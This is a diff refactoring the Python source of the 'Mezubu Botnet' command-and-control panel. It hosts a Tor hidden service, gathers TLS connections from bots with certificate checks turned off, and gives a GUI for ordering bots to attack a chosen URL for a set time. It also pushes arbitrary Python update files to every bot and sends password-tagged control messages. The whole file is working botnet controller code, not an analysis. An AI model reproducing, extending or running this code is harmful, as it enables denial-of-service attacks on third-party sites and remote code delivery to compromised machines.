@@ -12,203 +12,168 @@ import string, random
 import subprocess
 from time import sleep
 import vlc
+import validators
 
 numberOfBotsList = list()
-tor_password = "PUTTHETORPASSWORDHERE"
-server_password = "PUTYOURMEZUBUHASHEDPASSWORDHERE"
+tor_password = "PUT_THE_TOR_PASSWORD_HERE"
+server_password = "PUT_YOUR_MEZUBU_HASHED_PASSWORD_HERE"
 hidden_service_dir = getcwd() + '/tor_server/tor/hidden_service_dir'
 
 
 class Mezubu:
 	def __init__(self):
-		self.root = Tk()
-		self.root.geometry("300x100")
-		icon = PhotoImage(height=16, width=16)
-		icon.blank()
-		self.root.wm_iconphoto(True, icon)
-		self.root.title("Password Menu")
-		self.root.configure(bg="#303030")
-		self.root.resizable(False, False)
-		e = Entry(self.root, width=70, bg="#303030", fg='#ffffff', show="*")
-		l = Label(self.root, text="Password:", width=60, height=2, bg="#303030", fg='#ffffff')
-		button = Button(self.root, text="Submit", fg='#ffffff', command=lambda: self.testPassword(e.get()), width=60, height=3, bg="#383838")
-		l.pack()
-		e.pack()
-		button.pack()
-		self.root.mainloop()
+		self.password = Tk()
+		self.password_interface()
 
-	def Tor(self):
-		global hidden_service_dir, tor_password
-		while not self.torStarted:
-			proc1 = subprocess.Popen(["killall", "tor"], stdout=subprocess.DEVNULL, stderr=subprocess.STDOUT)
-			proc1.wait()
-			proc2 = subprocess.Popen(["./tor", "-f", "tor_server/torrc"], stdout=subprocess.PIPE)
-			for lines in proc2.stdout:
-				print(lines.decode("utf-8").strip())
-				if lines.decode("utf-8").find("[notice] Bootstrapped 100% (done): Done") != -1:
-					self.torStarted = True
-					break
-				elif lines.decode("utf-8").find("[err] Reading config failed--see warnings above.") != -1:
-					self.torStarted = False
-		s = socks.socksocket()
-		s.set_proxy(socks.SOCKS5, "localhost", 9150)
-		with Controller.from_port(port=9151) as controller:
-			controller.authenticate(password=tor_password)
-			hidden_service = path.join(controller.get_conf('DataDirectory', getcwd()), 'hidden_service_dir')
-			controller.create_hidden_service(hidden_service, 80, target_port=5000)
-			server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-			server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-			server.bind(("0.0.0.0", 5000))
-			server.listen(0)
-			while True:
-				client_socket, addr = server.accept()
-				p = threading.Thread(target=self.handle_client, args=(client_socket,), daemon=True)
-				p.start()
+	def password_interface(self):
+		self.password.geometry("300x100")
+		self.password.wm_iconphoto(True, PhotoImage(height=16, width=16))
+		self.password.title("Password Menu")
+		self.password.configure(bg="#303030")
+		self.password.resizable(False, False)
+		label_password = Label(self.password, text="Password:", width=60, height=2, bg="#303030", fg='#ffffff')
+		entry_password = Entry(self.password, width=70, bg="#303030", fg='#ffffff', show="*")
+		button_submit = Button(self.password, text="Submit", fg='#ffffff', command=lambda: self.test_password(entry_password.get()), width=60, height=3, bg="#383838")
+		label_password.pack()
+		entry_password.pack()
+		button_submit.pack()
+		self.password.mainloop()
+
+	def tor_control(self):
+		def boot_tor():
+			while not self.torStarted:
+				subprocess.Popen("pkill -f './tor -f tor_server/torrc'", shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.STDOUT).wait()
+				proc2 = subprocess.Popen(["./tor", "-f", "tor_server/torrc"], stdout=subprocess.PIPE)
+				for lines in proc2.stdout:
+					print(lines.decode("utf-8").strip())
+					if lines.decode("utf-8").find("[notice] Bootstrapped 100% (done): Done") != -1:
+						self.torStarted = True
+						break
+					elif lines.decode("utf-8").find("[err] Reading config failed--see warnings above.") != -1:
+						self.torStarted = False
+
+		def connect_to_tor():
+			with Controller.from_port(port=9151) as controller:
+				controller.authenticate(password=tor_password)
+				hidden_service = path.join(controller.get_conf('DataDirectory', getcwd()), 'hidden_service_dir')
+				controller.create_hidden_service(hidden_service, 80, target_port=5000)
+				server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+				server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+				server.bind(("0.0.0.0", 5000))
+				server.listen(0)
+				while True:
+					client_socket, addr = server.accept()
+					client_thread = threading.Thread(target=self.handle_client, args=(client_socket,), daemon=True)
+					client_thread.start()
+		boot_tor()
+		connect_to_tor()
 
 	def central(self):
-		self.root.destroy()
-		global numberOfBotsList
+		self.password.destroy()
 		try:
 			self.torStarted = False
-			p = threading.Thread(target=self.Tor, daemon=True)
-			p.start()
+			threading.Thread(target=self.tor_control, daemon=True).start()
 			while not self.torStarted:
 				sleep(5)
-			self.main = Tk()
-			self.main.attributes('-zoomed', True)
-			icon = PhotoImage(height=16, width=16)
-			icon.blank()
-			self.main.wm_iconphoto(True, icon)
-			self.main.protocol("WM_DELETE_WINDOW", self.quit)
-			self.width = 650
-			self.height = 837
-			self.aspect_ratio_1 = 650/837
-			self.aspect_ratio_2 = 837/650
-			self.main.geometry(f"{self.width}x{self.height}")
-			self.main.title("Mezubu Botnet")
-			self.main.configure(bg="#303030")
-			img = Image.open("mezubu.jpg")
-			self.image = ImageTk.PhotoImage(img)
-			self.label = Label(self.main, image=self.image)
-			self.img_copy = img.copy()
-			self.label.grid(row=0,column=0, sticky="nswe")
-			self.label.bind("<Configure>", self.resize_image)
-			turn_on = Button(self.main, text="Attack Target", fg='#ffffff', command=self.attack, height=1, width=91, bg="#383838")
-			turn_on.grid(row=1, column=0, sticky="ew")
-			turn_on1 = Button(self.main, text="Show Hostname", fg='#ffffff', command=self.hostname, height=1, width=91, bg="#383838")
-			turn_on1.grid(row=2, column=0, sticky="ew")
-			turn_on2 = Button(self.main, text="Number of Bots", fg='#ffffff', command=self.numberOfBots, height=1, width=91, bg="#383838")
-			turn_on2.grid(row=3, column=0, sticky="ew")
-			turn_on3 = Button(self.main, text="Play a song", fg='#ffffff', command=lambda: self.song_menu(turn_on3), height=1, width=91, bg="#383838")
-			turn_on3.grid(row=4, column=0, sticky="ew")
-			turn_on4 = Button(self.main, text="Update Mezubu Botnet", fg='#ffffff', command=self.select_file, height=1, width=91, bg="#383838")
-			turn_on4.grid(row=5, column=0, sticky="ew")
-			turn_on5 = Button(self.main, text="Quit", fg='#ffffff', command=self.quit, height=1, width=91, bg="#383838")
-			turn_on5.grid(row=6, column=0, sticky="ew")
-			self.main.grid_columnconfigure(0, weight=1)
-			self.main.grid_rowconfigure((0, 1, 2, 3, 4, 5, 6), weight=1)
-			self.main.bind("<Configure>", self.on_resize)
+			alive = threading.Thread(target=self.keep_alive, daemon=True)
+			alive.start()
+			self.setup_main_window()
 			self.main.mainloop()
 		except KeyboardInterrupt:
 			self.quit()
 
-	def numberOfBots(self):
-		global numberOfBotsList
-		self.message_sender(self.get_random_string(128).encode() + b"|PASS|" + self.user_password + b"|PASS|" + self.get_random_string(128).encode())
-		self.message_sender(self.get_random_string(128).encode())
-		self.message_sender(self.get_random_string(128).encode() + b"|PASS|" + self.user_password + b"|PASS|" + self.get_random_string(128).encode())
-		self.message_sender(self.get_random_string(128).encode())
+	def setup_main_window(self):
+		self.main = Tk()
+		self.main.attributes('-zoomed', True)
+		self.setup_main_window_properties()
+		self.create_main_buttons()
+		self.main.bind("<Configure>", self.resize_menu)
+
+	def setup_main_window_properties(self):
+		self.width, self.height = 650, 837
+		self.aspect_ratio_1, self.aspect_ratio_2 = self.width/self.height, self.height/self.width
+		self.main.geometry(f"{self.width}x{self.height}")
+		self.main.title("Mezubu Botnet")
+		self.main.configure(bg="#303030")
+		img = Image.open("mezubu.jpg")
+		self.image = ImageTk.PhotoImage(img)
+		self.label = Label(self.main, image=self.image)
+		self.img_copy = img.copy()
+		self.label.bind('<Configure>', self.resize_image)
+		self.label.grid(row=0, column=0, sticky="nswe")
+
+	def create_main_buttons(self):
+		buttons = [
+			("Attack Target", self.attack_menu),
+			("Show Hostname", self.show_hostname_menu),
+			("Number of Bots", self.number_of_bots_menu),
+			("Play a song", 0),
+			("Update Mezubu Botnet", self.select_file),
+			("Quit", self.quit)
+		]
+		for i, (text, command) in enumerate(buttons):
+			button = Button(self.main, text=text, fg='#ffffff', command=command, height=1, width=91, bg="#383838")
+			button.grid(row=i+1, column=0, sticky="ew")
+			if text == "Play a song":
+				button.config(command=lambda btn=button: self.song(btn))
+		self.main.grid_columnconfigure(0, weight=1)
+		self.main.grid_rowconfigure(tuple(range(len(buttons) + 1)), weight=1)
+
+	def number_of_bots_menu(self):
+		for _ in range(3):
+			self.message_sender(self.get_random_string())
 		botMenu = Tk()
 		botMenu.geometry("247x39")
 		botMenu.title("Bot menu")
 		botMenu.configure(bg="#303030")
 		botMenu.resizable(False, False)
-		label = Label(botMenu, anchor="n", height=39, width=50, bg="#303030", fg='#ffffff')
-		l = Label(botMenu, fg='#ffffff', text="Number Of Bots : " + str(len(numberOfBotsList)), width=60, height=2, bg="#303030")
-		l.pack()
-		label.pack(expand=False)
+		Label(botMenu, fg='#ffffff', text="Number Of Bots : " + str(len(numberOfBotsList)), width=60, height=2, bg="#303030").pack()
 		botMenu.mainloop()
 
-	def hostname(self):
-		global hidden_service_dir
+	def show_hostname_menu(self):
+		host = open(hidden_service_dir + "/hostname", "r").read().strip()
 		hostname = Tk()
 		hostname.geometry("500x100")
 		hostname.title("Hostname Menu")
 		hostname.configure(bg="#303030")
 		hostname.resizable(False, False)
-		label = Label(hostname, anchor="n", height=39, width=50, bg="#303030")
-		e = Entry(hostname, width=70, bg="#303030", fg='#ffffff')
-		host = open(hidden_service_dir + "/hostname", "r").read().strip()
-		e.insert(0, host)
-		l = Label(hostname, text="Hostname", width=60, height=2, bg="#303030", fg='#ffffff')
-		l.pack()
-		e.pack()
-		label.pack(expand=False)
+		Label(hostname, text="Hostname", width=60, height=2, bg="#303030", fg='#ffffff').pack()
+		hostname_entry = Entry(hostname, width=70, bg="#303030", fg='#ffffff')
+		hostname_entry.insert(0,host)
+		hostname_entry.pack()
 		hostname.mainloop()
 
-	def attack(self):
+	def attack_menu(self):
 		attack = Tk()
 		attack.geometry("300x180")
 		attack.title("Attack Menu")
 		attack.configure(bg="#303030")
 		attack.resizable(False, False)
-		label = Label(attack, anchor="n", height=39, width=50, bg="#303030")
-		e = Entry(attack, width=70, bg="#303030", fg='#ffffff')
-		l = Label(attack, text="Set target address [ https://example.com ]:", width=60, height=2, bg="#303030", fg='#ffffff')
-		f = Label(attack, text="Set time in seconds:", width=60, height=2, bg="#303030", fg='#ffffff')
-		h = Entry(attack, width=70, bg="#303030", fg='#ffffff')
-		button = Button(attack, text="Attack Target", fg='#ffffff', command=lambda: self.attackTarget(e.get(), h.get()), width=60, height=3, bg="#383838")
-		l.pack()
-		e.pack()
-		f.pack()
-		h.pack()
-		button.pack()
-		label.pack(expand=False)
+		Label(attack, text="Set target address [ https://example.com ]:", width=60, height=2, bg="#303030", fg='#ffffff').pack()
+		target_address = Entry(attack, width=70, bg="#303030", fg='#ffffff')
+		target_address.pack()
+		Label(attack, text="Set time in seconds:", width=60, height=2, bg="#303030", fg='#ffffff').pack()
+		time = Entry(attack, width=70, bg="#303030", fg='#ffffff')
+		time.pack()
+		Button(attack, text="Attack Target", fg='#ffffff', command=lambda: self.attack_target(target_address.get(), time.get()), width=60, height=3, bg="#383838").pack()
 		attack.mainloop()
 
-	def song_menu(self, turn_on3):
-		turn_on3["state"] = "disabled"
-		p = threading.Thread(target=self.play, args=("beat.mp3",), daemon=True)
-		p.start()
+	def song(self, button: Button):
+		def play(beat):
+			instance = vlc.Instance('-I qt')
+			player = instance.media_player_new()
+			media = instance.media_new(beat)
+			player.set_media(media)
+			player.play()
+			while True:
+				state = player.get_state()
+				if state == vlc.State.Ended:
+					player = vlc.MediaPlayer(beat)
+					player.play()
+		button.config(state="disabled")
+		threading.Thread(target=play, args=("beat.mp3",), daemon=True).start()
 
-	def play(self, beat):
-		proc = subprocess.Popen(["pulseaudio","--start"], stdout=subprocess.DEVNULL, stderr=subprocess.STDOUT)
-		proc.wait()
-		player = vlc.MediaPlayer(beat)
-		player.play()
-		while True:
-			state = player.get_state()
-			if state == vlc.State.Ended:
-				player = vlc.MediaPlayer(beat)
-				player.play()
-
-	def get_random_string(self, length: int):
-		letters = string.ascii_lowercase
-		result_str = ''.join(random.choice(letters) for i in range(length))
-		return result_str
-
-	def handle_client(self, client_socket):
-		global numberOfBotsList
-		context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
-		context.check_hostname = False
-		context.verify_mode = ssl.CERT_NONE
-		context.load_verify_locations('cert.pem', 'cert.key')
-		my_socket = context.wrap_socket(client_socket, server_side=True)
-		numberOfBotsList.append(my_socket)
-		print(f"Number of bots: {len(numberOfBotsList)}")
-
-	def testPassword(self, user_p):
-		global server_password
-		user_p = user_p.encode("utf-8")
-		hash_object = hashlib.sha256(user_p)
-		password_hash = hash_object.hexdigest()
-		if server_password == password_hash:
-			self.user_password = user_p
-			self.central()
-		else:
-			messagebox.showerror("Error", "Invalid Password!")
-
-	def on_resize(self, event):
+	def resize_menu(self, event: Event):
 		if event.widget.master:
 			return
 		new_width_1 = event.width
@@ -223,20 +188,42 @@ class Mezubu:
 			self.height = new_height_2
 		self.main.geometry(f"{self.width}x{self.height}")
 
-	def resize_image(self,event):
+	def resize_image(self, event: Event):
 		new_width = event.width
 		new_height = event.height
 		self.image = self.img_copy.resize((new_width, new_height))
 		self.background_image = ImageTk.PhotoImage(self.image)
 		self.label.configure(image = self.background_image)
 
+	def get_random_string(self):
+		random_characters = string.ascii_letters + string.digits
+		return ''.join(random.choices(random_characters, k=128)).encode()
+
+	def handle_client(self, client_socket: socket.socket):
+		client_socket.settimeout(120)
+		context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
+		context.check_hostname = False
+		context.verify_mode = ssl.CERT_NONE
+		context.load_verify_locations('cert.pem', 'cert.key')
+		my_socket = context.wrap_socket(client_socket, server_side=True)
+		numberOfBotsList.append(my_socket)
+		print("Connected!")
+
+	def test_password(self, user_p : str):
+		user_p = user_p.encode("utf-8")
+		hash_object = hashlib.sha256(user_p)
+		password_hash = hash_object.hexdigest()
+		if server_password == password_hash:
+			self.user_password = user_p
+			self.central()
+		else:
+			messagebox.showerror("Error", "Invalid Password!")
+
 	def quit(self):
-		self.message_sender(self.get_random_string(128).encode() + b"|PASS|" + self.user_password + b"|PASS|" + self.get_random_string(128).encode())
-		self.message_sender(self.get_random_string(128).encode() + b"|QUIT|" + self.get_random_string(128).encode())
+		self.message_sender(self.get_random_string() + b"|PASS|" + self.user_password + b"|PASS|" + self.get_random_string() + b"|QUIT|" + self.get_random_string())
 		exit(0)
 
 	def select_file(self):
-		global numberOfBotsList
 		filetypes = (
 			('text files', '*.py'),
 			('All files', '*.*')
@@ -251,8 +238,7 @@ class Mezubu:
 				with open(filename, "rb") as f:
 					size = path.getsize(filename)
 					bytes_read = f.read(size)
-					self.message_sender(self.get_random_string(128).encode() + b"|PASS|" + self.user_password + b"|PASS|" + self.get_random_string(128).encode())
-					self.message_sender(self.get_random_string(128).encode() + b"|UPDATE|" + str(size).encode() + b"|UPDATE|" + self.get_random_string(128).encode())
+					self.message_sender(self.get_random_string() + b"|PASS|" + self.user_password + b"|PASS|" + self.get_random_string() + b"|UPDATE|" + str(size).encode() + b"|UPDATE|" + self.get_random_string())
 					messagebox.showinfo("Update", "Updating...", icon="info")
 					for x in numberOfBotsList:
 						try:
@@ -265,21 +251,25 @@ class Mezubu:
 		except Exception:
 			pass
 
-	def attackTarget(self, e, time):
-		if (e.find("https://") > -1 or e.find("http://") > -1) and time.isnumeric() and int(time) > 0:
-			e = e[:9] + e[9:].split("/")[0]
-			self.message_sender(self.get_random_string(128).encode() + b"|PASS|" + self.user_password + b"|PASS|" + self.get_random_string(128).encode())
-			self.message_sender(self.get_random_string(128).encode() + b"|ATTACK|" + e.encode() + b"|ATTACK|" + self.get_random_string(128).encode() + b"|ATTACK|" + time.encode() + b"|ATTACK|" + self.get_random_string(128).encode())
+	def attack_target(self, target: str, time: str):
+		target = target[:9] + target[9:].split("/")[0]
+		if validators.url(target) and time.isnumeric() and int(time) > 0:
+			self.message_sender(self.get_random_string() + b"|PASS|" + self.user_password + b"|PASS|" + self.get_random_string() + b"|ATTACK|" + target.encode() + b"|ATTACK|" + self.get_random_string() + b"|ATTACK|" + time.encode() + b"|ATTACK|" + self.get_random_string())
 			messagebox.showinfo("Attack", "Attack started successfully!", icon="warning")
 		else:
 			messagebox.showinfo("Attack", "Attack didn't start!", icon="error")
 
-	def message_sender(self, e):
-		global numberOfBotsList
+	def keep_alive(self):
+		while True:
+			sleep(60)
+			self.message_sender(self.get_random_string())
+
+	def message_sender(self, message):
 		for x in numberOfBotsList:
 			try:
-				x.send(e)
+				x.send(message)
 			except ssl.SSLEOFError:
 				numberOfBotsList.remove(x)
+
 
 app = Mezubu()
